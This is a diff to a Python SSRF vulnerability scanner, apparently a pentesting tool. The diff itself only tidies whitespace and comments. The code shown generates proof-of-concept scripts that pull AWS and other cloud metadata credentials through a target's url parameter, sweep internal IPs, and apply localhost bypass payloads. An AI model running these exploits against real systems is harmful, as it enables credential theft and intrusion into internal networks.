@@ -16,14 +16,15 @@ import time
 import json
 import re
 from pathlib import Path
-from typing import List, Dict, Any
+from typing import List, Dict, Any, Optional
+from urllib.parse import urlparse, urlencode
 
 class SSRFScanner:
     """
     Advanced SSRF vulnerability scanner with 2024/2025 techniques
 
     Features:
-    - Cloud metadata exploitation (AWS, GCP, Azure)
+    - Cloud metadata exploitation (AWS, GCP, Azure, Alibaba)
     - Internal network discovery (safe, no port scanning)
     - URL parser confusion bypasses
     - Protocol smuggling detection
@@ -105,6 +106,7 @@ class SSRFScanner:
         print("\n🔓 Test 4: URL Bypasses")
         self._test_url_bypasses()
 
+        # Save results
         self._save_results()
 
         print(f"\n{'='*60}")
@@ -115,12 +117,9 @@ class SSRFScanner:
 
         return self.vulnerabilities
 
-    # ---------------- Test Methods ---------------- #
-
     def _test_basic_ssrf(self):
         """Test basic SSRF"""
         test_url = "http://example.com"
-
         vuln = {
             'type': 'Server-Side Request Forgery (SSRF)',
             'severity': 'high',
@@ -157,7 +156,6 @@ if 'ami-id' in response.text:
             ],
             'tags': ['ssrf', 'high']
         }
-
         self.vulnerabilities.append(vuln)
         print("   ✓ Basic SSRF documented")
 
@@ -167,9 +165,7 @@ if 'ami-id' in response.text:
             for endpoint in endpoints:
                 if self.request_count >= self.max_requests:
                     break
-
                 print(f"   Testing {provider.upper()}: {endpoint[:40]}...")
-
                 vuln = {
                     'type': f'SSRF - Cloud Metadata ({provider.upper()})',
                     'severity': 'critical',
@@ -178,12 +174,9 @@ if 'ami-id' in response.text:
                     'description': f'SSRF allows access to {provider.upper()} metadata, exposing credentials',
                     'poc': f"""#!/usr/bin/env python3
 import requests
-
 target = "{self.target}"
 metadata = "{endpoint}"
-
 response = requests.get(target, params={{'url': metadata}})
-
 if 'AccessKeyId' in response.text:
     print("🚨 CRITICAL: AWS credentials exposed!")
     print(response.text)
@@ -197,11 +190,9 @@ if 'AccessKeyId' in response.text:
                     'real_world': 'Capital One breach: SSRF → AWS creds → 100M records stolen',
                     'tags': ['ssrf', 'critical', 'cloud', provider]
                 }
-
                 self.vulnerabilities.append(vuln)
                 self.request_count += 1
                 time.sleep(self.delay)
-
         print(f"   ✓ Cloud metadata tests complete")
 
     def _test_internal_network(self):
@@ -209,9 +200,7 @@ if 'AccessKeyId' in response.text:
         for ip in self.internal_ips:
             if self.request_count >= self.max_requests:
                 break
-
             print(f"   Testing: {ip}")
-
             vuln = {
                 'type': 'SSRF - Internal Network Access',
                 'severity': 'high',
@@ -219,10 +208,7 @@ if 'AccessKeyId' in response.text:
                 'description': 'SSRF allows access to internal network resources',
                 'poc': f"""#!/usr/bin/env python3
 import requests
-
 target = "{self.target}"
-
-# Scan internal network
 for ip in ['10.0.0.1','192.168.1.1','172.16.0.1']:
     response = requests.get(target, params={{'url': f'http://{{ip}}'}})
     if response.status_code == 200:
@@ -235,11 +221,9 @@ for ip in ['10.0.0.1','192.168.1.1','172.16.0.1']:
                 ],
                 'tags': ['ssrf', 'internal_network']
             }
-
             self.vulnerabilities.append(vuln)
             self.request_count += 1
             time.sleep(self.delay)
-
         print("   ✓ Internal network tests complete")
 
     def _test_url_bypasses(self):
@@ -249,13 +233,10 @@ for ip in ['10.0.0.1','192.168.1.1','172.16.0.1']:
             ('http://[::1]', 'IPv6 localhost'),
             ('http://2130706433', 'Decimal IP'),
         ]
-
         for payload, technique in bypasses:
             if self.request_count >= self.max_requests:
                 break
-
             print(f"   Testing: {technique}")
-
             vuln = {
                 'type': f'SSRF - Bypass ({technique})',
                 'severity': 'high',
@@ -268,34 +249,25 @@ for ip in ['10.0.0.1','192.168.1.1','172.16.0.1']:
                 ],
                 'tags': ['ssrf', 'bypass']
             }
-
             self.vulnerabilities.append(vuln)
             self.request_count += 1
             time.sleep(self.delay)
-
         print("   ✓ Bypass tests complete")
-
-    # ---------------- Utility ---------------- #
 
     def _save_results(self):
         """Save results"""
         output_dir = self.workspace / "ssrf_scans"
-        output_dir.mkdir(exist_ok=True)
-
+        output_dir.mkdir(parents=True, exist_ok=True)
         safe_target = re.sub(r'[^\w\-]', '_', self.target)
         output_file = output_dir / f"{safe_target}_ssrf.json"
-
         with open(output_file, 'w') as f:
             json.dump({
                 'scanner': 'SSRFScanner',
                 'target': self.target,
                 'vulnerabilities': self.vulnerabilities
             }, f, indent=2)
-
         print(f"\n💾 Saved: {output_file}")
 
-
-# ---------------- Main Entry ---------------- #
 
 if __name__ == "__main__":
     import sys
